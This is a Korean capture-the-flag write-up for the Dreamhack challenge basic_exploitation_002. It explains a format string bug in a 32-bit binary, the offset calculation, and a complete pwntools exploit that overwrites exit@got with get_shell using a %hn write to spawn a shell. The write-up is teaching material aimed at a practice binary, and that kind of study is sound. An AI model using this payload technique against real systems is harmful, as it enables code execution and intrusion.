# Format String Bug (basic_exploitation_002)

## 개요

이 문제는 **포맷 스트링 버그(Format String Bug, FSB)**를 이용하는 전형적인 32비트 문제임. `printf`에 사용자 입력을 포맷 문자열(format string)로 그대로 넘겨서 `printf(buf)` 형태로 호출하기 때문에, 공격자가 `%p`, `%x`, `%n`, `%hn` 같은 변환 지정자(conversion specifier)를 입력에 심을 수 있음.

목표는 `main`이 마지막에 호출하는 `exit(0)`를 가로채는 것임. `exit`의 GOT 엔트리를 `get_shell()`의 주소로 덮어쓰면, `exit(0)` 호출 시점에 `get_shell()`이 대신 실행되어 `system("/bin/sh")`로 셸을 획득함.

```c
void get_shell() {
    system("/bin/sh");
}

int main(int argc, char *argv[]) {
    char buf[0x80];
    initialize();
    read(0, buf, 0x80);
    printf(buf);        // <-- 포맷 스트링 버그 (형식 문자열에 사용자 입력)
    exit(0);            // <-- 이 호출을 get_shell()로 리다이렉트
}
```

- `printf(buf)`는 `printf("%s", buf)`가 아니라 `buf` 자체를 포맷 문자열로 사용함 → FSB.
- `read`로 `buf`에 최대 `0x80`바이트를 받으므로 포맷 페이로드를 충분히 넣을 수 있음.
- 입력이 처리된 뒤 `exit(0)`가 반드시 호출되므로, `exit@got`를 덮어두면 자연스럽게 트리거됨(별도 트리거 불필요).

## 바이너리 분석

`checksec` 결과:

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
Stripped: No
```

| 보호기법 | 상태 | 공격에 미치는 영향 |
|---|---|---|
| **No PIE** | 비활성 | 바이너리 주소 고정 → `get_shell`, `exit@got` 주소를 그대로 사용 가능 |
| **Partial RELRO** | 부분 | `.got.plt`가 **쓰기 가능** → GOT overwrite 가능 (Full RELRO였다면 불가) |
| NX | 활성 | 스택 실행 불가 → 쉘코드 주입 대신 기존 `get_shell` 재사용 |
| No Canary | 없음 | (이 문제에서는 BOF가 아니라 FSB를 쓰므로 직접 관계는 없음) |

핵심은 **No PIE + Partial RELRO** 조합임. PIE가 없어 주소가 고정이고 RELRO가 Partial이라 GOT에 쓸 수 있으므로, FSB의 쓰기 프리미티브(`%n` 계열)로 `exit@got`를 `get_shell`로 바꾸는 고전적인 공격이 그대로 성립함.

정적 분석으로 구한 주소(32비트, 고정):

```
get_shell : 0x08048609
exit@got  : 0x0804a024
```

## 포맷 스트링 핵심 원리

### %x / %p — 스택 leak

`printf`는 가변 인자 함수라서, 포맷 문자열에 변환 지정자가 나올 때마다 **스택에서 순서대로 인자를 꺼내** 출력함. 그런데 호출 측(`printf(buf)`)은 실제로는 추가 인자를 넘기지 않았으므로, `%x`/`%p`가 스택에 이미 쌓여 있던 값들을 그대로 긁어 출력하게 됨 → 스택 메모리 leak.

### 위치 지정 인자 `%N$`

`%N$x`처럼 `N$`를 붙이면 **N번째 가변 인자**를 직접 지정해서 꺼낼 수 있음(positional argument). 예: `%5$p`는 5번째 인자를 포인터로 출력. 이 문법 덕분에 앞의 인자들을 모두 소비하지 않고 원하는 위치를 바로 겨냥할 수 있음.

### %n / %hn — 임의 주소 쓰기(AAW)

`%n`은 "지금까지 출력한 문자 수"를 해당 인자가 가리키는 주소에 **써 넣음**. 즉 인자 위치에 쓰고 싶은 **주소**를 놓고, 그 앞에서 출력 문자 수를 원하는 값만큼 만들면 임의 주소 쓰기가 됨.

- `%n`  : 4바이트(int) 단위로 기록
- `%hn` : 2바이트(short, half-word) 단위로 기록
- `%hhn`: 1바이트 단위로 기록

출력 문자 수는 폭 지정자(width specifier)로 손쉽게 늘릴 수 있음. `%<N>c`는 한 문자를 폭 `N`으로 채워 출력하므로 결과적으로 `N`개의 문자가 출력됨.

이 문제처럼 **쓸 값의 하위 2바이트만 바꾸면 되는 경우** `%hn`을 쓰면 한 번의 쓰기로 끝남. `exit@got = 0x0804a024`의 원래 값은 바이너리 내부(PLT resolver stub, `0x0804xxxx`)를 가리키므로 상위 2바이트가 이미 `0x0804`임. 따라서 **하위 2바이트만 `0x8609`로 덮으면** `exit@got`가 `0x08048609 = get_shell`이 되어, 상위 2바이트를 건드릴 필요가 없음 → `%hn` 한 방.

## GDB로 오프셋/주소 구하기

### 1) GOT 주소 (`exit@got`)

No PIE라서 GOT 주소는 고정. 여러 방법으로 동일한 값을 얻을 수 있음:

```bash
# objdump 로 재배치(GOT) 항목 확인
objdump -R basic_exploitation_002 | grep exit
#  0804a024 R_386_JUMP_SLOT   exit

# pwntools 로
python3 -c "from pwn import *; e=ELF('basic_exploitation_002'); print(hex(e.got['exit']))"
#  0x804a024
```

pwndbg에서는 `got` 명령 또는 `p &exit@got` 식으로도 확인 가능. `get_shell` 주소는 `p get_shell` / `e.symbols['get_shell']`로 `0x08048609`.

### 2) 포맷 스트링 인자 오프셋 (가장 중요)

`%N$` 에서 N을 결정해야 함. 즉 "내 입력 버퍼(`buf`)가 `printf`의 몇 번째 인자 위치에 오는가"를 찾아야 함. 방법은 **마커를 넣고 몇 번째에서 되돌아오는지 세는 것**:

```bash
# 입력으로 전송
AAAA.%p.%p.%p.%p.%p.%p.%p.%p
# 또는 위치 지정으로 한 방에
AAAA%1$p.%2$p.%3$p.%4$p.%5$p.%6$p
```

출력에서 `0x41414141`(="AAAA")이 나타나는 위치가 바로 **버퍼의 시작이 위치한 인자 번호**임. 이 바이너리에서는 `buf`의 시작이 **1번째 인자**에 해당함(`%1$p`가 `0x41414141`을 출력). 즉:

| 인자 번호 | 가리키는 buf 오프셋 | 내용(페이로드 기준) |
|---|---|---|
| `%1$` | buf+0  | `"%343"` (포맷 문자열 앞부분) |
| `%2$` | buf+4  | `"13c%"` |
| `%3$` | buf+8  | `"5$hn"` |
| `%4$` | buf+12 | `"aaaa"` (패딩) |
| `%5$` | buf+16 | **`p32(exit_got)`** ← 여기를 겨냥 |

GDB로 직접 확인하려면 `b *printf` 또는 `b printf`로 멈춘 뒤, 포맷 문자열 포인터 바로 위 스택을 `x/20wx $esp`로 덤프해서 입력 버퍼가 몇 번째 워드(word)에 나타나는지 세면 됨. 32비트에서 각 인자는 4바이트이므로 **`buf+16` → `16/4 + 1 = 5`번째 인자**가 됨.

이 "buf가 1번 인자 = 겨냥 주소를 buf+16에 두면 5번 인자"라는 사실이 `poc.py`에서 페이로드를 정확히 16바이트로 패딩한 뒤 `%5$hn`을 쓰는 근거임.

## 익스플로잇 ( `poc.py` )

```python
from pwn import *
p = remote('host3.dreamhack.games', 16537)
e = ELF('./basic_exploitation_002')
libc = e.libc

get_shell = p32(e.symbols['get_shell'])   # p32(0x08048609) = b'\x09\x86\x04\x08'
exit_got  = e.got['exit']                 # 0x0804a024

under = get_shell[:2]                      # b'\x09\x86'  (하위 2바이트)
under = int.from_bytes(under, "little")    # 0x8609 = 34313

payload  = f"%{under}c".encode()           # b"%34313c"  → 34313 문자 출력
payload += b"%5$hn"                        # 5번째 인자(주소)에 2바이트 기록
to_add   = 16 - len(payload)               # 16바이트 정렬용 패딩 길이 (= 4)
payload += b"a" * to_add                   # "aaaa"
payload += p32(exit_got)                   # buf+16 = 5번째 인자 = 0x0804a024

p.send(payload)
p.interactive()
```

### 단계별 설명

1. **쓸 값 준비** — `get_shell = 0x08048609`. 하위 2바이트 `0x8609`만 덮으면 되므로 `get_shell[:2]`를 리틀엔디언 정수로 변환 → `under = 0x8609 = 34313`. 이 값이 "출력해야 할 문자 수"이자 `%hn`으로 기록될 값이 됨.

2. **문자 수 만들기** — `f"%{under}c"` = `"%34313c"`. 폭 지정자로 한 문자를 34313 폭으로 출력 → 지금까지 출력된 문자 수가 정확히 `34313 = 0x8609`가 됨. (`%c`가 1번째 가변 인자를 소비하지만 그 값은 쓰이지 않으므로 무관.)

3. **쓰기 수행** — `"%5$hn"` : 5번째 인자(= `buf+16`에 놓은 `exit@got` 주소)가 가리키는 곳에 "지금까지 출력한 문자 수"(`0x8609`)를 **2바이트(`hn`)**로 기록. 결과적으로 `*(short *)exit_got = 0x8609`.

4. **16바이트 정렬** — `%5$hn`이 `buf+16`을 겨냥하므로, 주소 `p32(exit_got)`가 정확히 `buf+16`(5번째 인자 슬롯)에 위치해야 함. 포맷 문자열 `"%34313c%5$hn"`의 길이는 12바이트이므로 `"a"*4`로 16바이트를 채운 뒤 주소를 이어 붙임.

5. **GOT 덮어쓰기 완성** — `exit@got`의 상위 2바이트는 원래 `0x0804`로 유지되고 하위 2바이트만 `0x8609`로 바뀜 → `exit@got = 0x08048609 = get_shell`. `%hn`을 쓴 덕분에 상위 바이트를 손대지 않아 한 번의 쓰기로 완료됨.

6. **트리거** — 입력 처리 후 `main`이 `exit(0)`를 호출하면, GOT를 타고 `get_shell()`로 점프 → `system("/bin/sh")` 실행 → `p.interactive()`로 셸 획득.

### 값 검증

```
p32(get_shell)      = b'\x09\x86\x04\x08'
get_shell[:2]       = b'\x09\x86'  → 0x8609 = 34313
len("%34313c%5$hn") = 12  →  패딩 4바이트  →  exit_got at buf+16
buf+16              = 5번째 인자  →  %5$hn
exit@got : 0x0804____  →  하위 2바이트 0x8609 기록  →  0x08048609 = get_shell
```

## 핵심 요약

| 요소 | 내용 |
|---|---|
| 취약점 | 포맷 스트링 버그 — `printf(buf)`로 사용자 입력을 형식 문자열로 사용 |
| write primitive | `%hn` (2바이트 단위 임의 주소 쓰기) |
| 쓰기 대상 | `exit@got = 0x0804a024` (Partial RELRO → GOT 쓰기 가능) |
| 쓰기 값 | `get_shell = 0x08048609`의 하위 2바이트 `0x8609` (상위 `0x0804`는 원래 값 유지) |
| 고정 주소 | No PIE → `get_shell`, `exit@got` 주소 고정 |
| 인자 오프셋 | `buf`가 1번째 인자 → 겨냥 주소를 `buf+16`에 두어 `%5$hn`으로 접근 |
| 문자 수 만들기 | `%34313c` (폭 지정자로 출력 문자 수 = `0x8609` = 34313) |
| 트리거 | `main` 끝의 `exit(0)` → GOT 리다이렉트 → `get_shell()` → `system("/bin/sh")` |

이 문제의 교훈은, `printf`에 사용자 입력을 포맷 문자열로 직접 넘기는 것만으로 **임의 주소 쓰기**가 가능하다는 점임. 특히 **Partial RELRO + No PIE** 환경에서는 쓰기 대상으로 삼기 좋은 GOT가 고정 주소에 쓰기 가능 상태로 놓여 있어, FSB의 `%n`/`%hn` 한 번만으로 `exit`·`printf` 등 이후 호출될 함수의 GOT를 원샷 함수(`get_shell`)로 바꿔 흐름을 탈취할 수 있음. `%hn`으로 변경이 필요한 2바이트만 건드린 것도 쓰기 횟수를 1회로 줄이는 중요한 테크닉임.
